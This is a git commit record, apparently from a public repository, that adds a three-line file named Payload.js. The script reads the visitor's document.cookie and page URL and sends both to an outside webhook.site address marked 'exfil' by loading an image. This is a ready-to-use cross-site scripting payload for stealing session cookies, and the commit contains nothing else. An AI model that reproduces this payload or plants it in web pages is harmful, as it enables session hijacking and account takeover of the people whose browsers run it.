12f0078a3163d6c081b17b08c4f62737d69ea80c
Ecar <86429683+Poggiecar@users.noreply.github.com>
2026-04-20 14:29:25 -0300

    Create Payload.js

---
+++ Payload.js
@@ -0,0 +1,3 @@
+var d = document.cookie;
+var u = location.href;
+new Image().src='https://webhook.site/e304f3f1-e6e4-41c6-9f30-7a7acecf9c0a/exfil?c='+encodeURIComponent(d)+'&u='+encodeURIComponent(u);
